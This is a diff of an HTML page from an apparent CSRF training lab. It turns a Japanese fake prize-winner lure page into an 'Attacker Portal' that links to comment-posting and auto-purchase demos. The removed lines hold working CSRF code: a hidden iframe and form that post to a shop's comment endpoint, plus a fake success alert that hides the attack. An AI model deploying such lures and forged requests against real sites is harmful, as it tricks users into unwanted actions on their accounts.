@@ -3,98 +3,97 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Attacker Site (CSRF Demo)</title>
+    <title>Attacker Portal</title>
     <style>
-      body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; margin: 24px; line-height: 1.5; }
-      code { background: #f2f2f2; padding: 1px 4px; border-radius: 4px; }
-      .card { border: 1px solid #ddd; border-radius: 8px; padding: 12px; margin-bottom: 12px; }
-      button { padding: 8px 12px; }
-      input { width: 100%; padding: 8px; margin: 6px 0 10px; }
-      .muted { color: #666; }
+      :root { color-scheme: dark; }
+      body {
+        margin: 0;
+        min-height: 100vh;
+        font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+        background: radial-gradient(circle at top, #2b0b12, #0b0b10 60%);
+        color: #f5f5f8;
+      }
+      a { color: inherit; text-decoration: none; }
+      .banner {
+        background: #b00020;
+        color: #fff;
+        padding: 10px 16px;
+        font-weight: 700;
+        letter-spacing: 0.05em;
+        text-align: center;
+      }
+      .wrap {
+        max-width: 980px;
+        margin: 0 auto;
+        padding: 36px 16px 56px;
+      }
+      .title {
+        font-size: 32px;
+        margin: 0 0 10px;
+        color: #ff6b6b;
+      }
+      .subtitle { margin: 0 0 24px; color: #c4c4d2; }
+      .grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+        gap: 16px;
+      }
+      .card {
+        background: #14141b;
+        border: 1px solid #2d1b1b;
+        border-radius: 14px;
+        padding: 18px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+      }
+      .card h3 { margin: 0 0 8px; }
+      .card p { margin: 0 0 12px; color: #b7b7c6; }
+      .btn {
+        display: inline-block;
+        padding: 10px 14px;
+        border-radius: 8px;
+        background: #b00020;
+        color: #fff;
+        font-weight: 700;
+      }
+      .muted {
+        margin-top: 22px;
+        color: #9a9aa6;
+        font-size: 13px;
+      }
+      code { background: #1f1f25; padding: 2px 6px; border-radius: 6px; }
     </style>
   </head>
   <body>
-    <div style="text-align: center; margin-top: 50px;">
-      <h1 style="color: #e44d26;">✨ おめでとうございます！ ✨</h1>
-      <div class="card" style="display: inline-block; max-width: 500px; border: 2px solid #e44d26; background-color: #fff9f8; padding: 20px; border-radius: 12px;">
-        <h2>🎊 豪華景品が当選しました 🎊</h2>
-        <p>あなたは本日、1,000,000人目の訪問者として選ばれました！</p>
-        <p>以下のボタンをクリックして、今すぐ景品（最新スマートフォン等）を受け取ってください。</p>
+    <div class="banner">⚠ 攻撃者サイト / Attacker Site ⚠</div>
+    <div class="wrap">
+      <h1 class="title">攻撃者ポータル</h1>
+      <p class="subtitle">学習用デモのための攻撃側ダッシュボードです。</p>
 
-        <button id="attackBtn" type="button" style="background-color: #e44d26; color: white; border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 8px;">
-          🎁 景品を受け取る
-        </button>
-
-        <p style="font-size: 12px; color: #999; margin-top: 20px;">
-          ※受け取り期限：本日中<br>
-          ※このキャンペーンは広告主によって提供されています。
-        </p>
-      </div>
-
-      <div style="margin-top: 100px; padding: 20px; background: #f9f9f9; font-size: 14px; color: #666; text-align: left; border-top: 1px solid #ddd;">
-        <p><strong>【学習用デバッグ表示】</strong></p>
-        <p>ターゲット: <code id="targetBase"></code></p>
-        <p>
-          このページはCSRF体験用の罠サイトを模したものです。ボタンをクリックすると、裏側でShopサイト（ターゲット）に対して「商品へのコメント」が勝手に投稿されます。
-        </p>
-        <div style="display: none;">
-          <input id="commentBody" value="この商品は最高です！(CSRF攻撃による自動投稿)" />
+      <div class="grid">
+        <div class="card">
+          <h3>CSRF コメント投稿</h3>
+          <p>ワンクリックでターゲットに対してコメント投稿CSRFを送信します。</p>
+          <a class="btn" href="/csrf">CSRF を開く</a>
+        </div>
+        <div class="card">
+          <h3>CSRF 自動購入</h3>
+          <p>ページを開くと即座に購入リクエストを送信します。</p>
+          <a class="btn" href="/auto-purchase">自動購入を開く</a>
+        </div>
+        <div class="card">
+          <h3>ステータス</h3>
+          <p>現在のターゲット: <code id="targetBase"></code></p>
+          <p>環境変数 <code>TARGET_BASE</code> で変更できます。</p>
         </div>
       </div>
+
+      <p class="muted">※学習目的のデモです。実運用では使用しないでください。</p>
     </div>
 
     <script>
-      // server.js が注入する
       const TARGET_BASE = window.__TARGET_BASE__ || "http://localhost:4000";
-      document.getElementById("targetBase").textContent = TARGET_BASE;
-
-      function buildPayload() {
-        const body = document.getElementById("commentBody").value;
-        return { body };
-      }
-
-      function submitPost() {
-        const payload = buildPayload();
-
-        // ページ遷移（リダイレクト）を防ぐために、隠し iframe を作成してそこへ送信する
-        const iframeName = "csrf-frame";
-        let iframe = document.getElementsByName(iframeName)[0];
-        if (!iframe) {
-          iframe = document.createElement("iframe");
-          iframe.name = iframeName;
-          iframe.style.display = "none";
-          document.body.appendChild(iframe);
-        }
-
-        const form = document.createElement("form");
-        form.method = "POST";
-        // 商品ID 1 (Coffee Beans) にコメントを投稿する
-        form.action = new URL("/products/1/comments", TARGET_BASE).toString();
-        form.target = iframeName; // 送信先を iframe に指定
-
-        Object.entries(payload).forEach(([k, v]) => {
-          const input = document.createElement("input");
-          input.type = "hidden";
-          input.name = k;
-          input.value = v;
-          form.appendChild(input);
-        });
-        document.body.appendChild(form);
-        form.submit();
-
-        // 攻撃が完了したように見せかける（ユーザーには攻撃だと悟らせない）
-        document.getElementById("attackBtn").textContent = "✅ 申請済み";
-        document.getElementById("attackBtn").disabled = true;
-        document.getElementById("attackBtn").style.backgroundColor = "#ccc";
-        alert("景品の受け取り申請を受け付けました。発送までしばらくお待ちください。");
-      }
-
-      document.getElementById("attackBtn").addEventListener("click", () => {
-        submitPost();
-      });
-
-      // 自動実行（ページを開いた瞬間にCSRFを走らせたい場合）
-      // submitPost();
+      const el = document.getElementById("targetBase");
+      if (el) el.textContent = TARGET_BASE;
     </script>
   </body>
 </html>
